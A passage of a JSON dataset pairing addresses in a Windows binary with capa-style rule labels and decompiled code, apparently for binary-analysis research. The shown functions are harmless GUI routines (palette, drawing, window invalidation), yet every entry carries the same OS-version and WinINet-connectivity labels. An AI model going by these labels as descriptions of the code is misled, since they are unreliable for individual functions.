0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x43a5ec;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 590
    },
    "0044ed30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044ed30(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.0040483c(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x80))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 253
    },
    "0044ef5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ef5c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.0041fcb0();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0044f424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f424(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x44f469;\n            fcn.0041991c();\n            puStack40 = 0x44f47a;\n            fcn.0041fb4c();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x44f49a;\n            fcn.00419680();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x44f544;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.0040483c();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.0040483c();\n                fcn.0041f90c();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.0040483c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 531
    },
    "0044f6c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f6c4(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44f745;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.004075f4();\n        fcn.0040daac(in_stack_ffffffd4, arg_ch);\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x44f74c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 396
    },
    "0044f860": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f860(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x497c7c == 0)) && (*0x44f8c8 == (*0x44f8c4 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.00450f7c(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "0044fdf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fdf0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0044fe8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fe8c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0044feb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044feb0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0044ffe8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044ffe8(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45007e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.004075f4();\n        fcn.0040daac(uVar2, arg_ch);\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x450085);\n    return;\n}\n",
        "token_count": 397
    },
    "00450090": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450090(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.00419834();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.004197d8();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.0044f5e4();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 280
    },
    "0045011c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045011c(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.00457d34();\n    if (cVar2 != '\\0') {\n        fcn.0044f5e4();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.00450090(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.00457a28(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "004501bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004501bc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 173
    },
    "00450204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450204(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    piVar1 = fcn.0043b1a8();\n    piVar2 = fcn.0044ca70();\n    if ((((piVar2 != NULL) && (piVar1 != piVar2)) && (in_EAX != piVar2)) && (piVar2[0xc] == 0)) {\n        (**(*piVar2 + 0x78))();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        if ((piVar1 == NULL) || (in_EAX == piVar1)) {\n            arg_8h = *(param_2 + 8);\n            uVar3 = fcn.00450f7c(arg_8h);\n            *(arg_8h + 0xc) = uVar3;\n        }\n        else {\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00450298": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450298(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x4502dd;\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x4502fd;\n                uStack20 = fcn.00457a28();\n                puStack24 = 0x450303;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x450371;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00455318();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.00457a28(uVar2, 0x45038e);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x450383;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x45038e;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 500
    },
    "00450398": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450398(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "004503c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004503c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x492b04 + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "004504fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004504fc(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00450538": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450538(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00450584": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450584(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0045069c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045069c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0045071c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.0045071c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.0040483c();\n            }\n            else {\n                var_ah = fcn.0040483c();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 427
    },
    "00450888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450888(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x45089d;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x4508c4;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x4508d7;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x4509a3;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.00450888::var_1h + 1;\n    uVar4 = fcn.00424860();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x4509aa);\n    return;\n}\n",
        "token_count": 790
    },
    "004509d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004509d4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint uStack23;\n    \n    cVar1 = fcn.004047cc();\n    if ((*0x497c80 != '\\0') && (cVar1 == '\\0')) {\n        fcn.004047f0();\n    }\n    fcn.0044f804();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = *(param_2 + 4);\n            fcn.0040483c(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = *(param_2 + 4);\n            fcn.0040483c(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.0040483c(uStack23);\n        }\n        else {\n            fcn.0040483c(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "00450ac4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00450ac4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00418360();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.0044f754();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.00457a28();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.0044fc50();\n        arg_8h_00 = &fcn.00450ac4::var_34h;\n        uStack80 = 0x450b75;\n        fcn.0044fc64();\n        uStack80 = 0x450b82;\n        fcn.004183b0(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x450b96;\n        var_5h = fcn.00450ca4();\n        goto code_r0x00450c97;\n    }\n    fcn.00450fb0();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x00450bc9:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.0040483c();\n        if (cVar1 != '\\0') goto code_r0x00450bc9;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.0044d038();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00457a28();\n        }\n        fcn.0044f5e4();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.00450ac4::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.00457a28(&fcn.00450ac4::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.0040483c();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00404640(0x450c97);\n        return uVar4;\n    }\ncode_r0x00450c97:\n    return var_5h;\n}\n",
        "token_count": 1001
    },
    "00450d4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
